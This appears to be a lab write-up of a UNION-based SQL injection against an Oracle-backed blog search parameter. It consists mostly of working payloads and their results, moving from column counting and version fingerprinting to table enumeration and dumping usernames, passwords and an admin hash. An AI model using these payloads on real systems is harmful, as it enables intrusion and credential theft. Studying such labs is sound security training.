# Oracle

author parameter

' - Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated&#x20;

'' - Error disappears.

```
' ORDER BY 1-- OK
' ORDER BY 2-- OK
' ORDER BY 3-- OK
' ORDER BY 4-- ERROR

' UNION SELECT 'a', NULL, NULL-- ERROR
' UNION SELECT NULL,'a',NULL-- ERROR
' UNION SELECT NULL,NULL,'1'-- ERROR
```

Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected

```
On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.                 
There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual                 
For more information, see our SQL injection cheat sheet.      
```

We can use legit database from Oracle - FROM DUAL

```
' UNION SELECT NULL FROM DUAL-- ERROR
' UNION SELECT NULL,NULL FROM DUAL-- ERROR
' UNION SELECT NULL,NULL,NULL FROM DUAL-- OK.

' UNION SELECT 'a', NULL, NULL FROM DUAL-- OK.
' UNION SELECT NULL,'a',NULL FROM DUAL-- OK.
‘ UNION SELECT NULL,NULL,’a' FROM DUAL-- ERROR
' UNION SELECT NULL,NULL,1 FROM DUAL-- OK.
```

\| Oracle | SELECT banner FROM v$version SELECT version FROM v$instance |

[https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

```
' UNION SELECT banner,NULL,NULL FROM v$version--
```

```
Blog entry from Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production with title null from 0
```

https://www.oracletutorial.com/oracle-administration/oracle-show-tables/

```
' UNION SELECT table_name,NULL,NULL FROM user_tables-- OK.
' UNION SELECT table_name,NULL,NULL FROM all_tables-- OK.
' UNION SELECT table_name,NULL,NULL FROM dba_tables-- ERROR.
```

Blog entry from TESTADMINS with title null from 0 Blog entry from TESTCONTENT with title null from 0 Blog entry from TESTUSERS with title null from 0

```
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='TESTUSERS'--
```

```
Blog entry from PASSWORD with title null from 0
Blog entry from USERID with title null from 0
Blog entry from USERNAME with title null from 0
```

```
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='TESTADMINS'--
```

```
Blog entry from ADMINID with title null from 0
Blog entry from ADMINNAME with title null from 0
Blog entry from PASSWORD with title null from 0
```

```
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='TESTCONTENT'--
```

```
Blog entry from AUTHOR with title null from 0
Blog entry from CONTENTID with title null from 0
Blog entry from RELEASE with title null from 0
Blog entry from TITLE with title null from 0
```

```
' UNION SELECT PASSWORD,USERNAME,USERID FROM TESTUSERS--
```

```
Blog entry from passpass1 with title can from 2
Blog entry from letmein123 with title mary from 3
Blog entry from mypassword with title william from 1
```

```
' UNION SELECT PASSWORD,ADMINNAME,ADMINID FROM TESTADMINS--
```

```
Blog entry from 49a12f19ea4b304b84b23c86a2f319c1 with title admin from 1
```
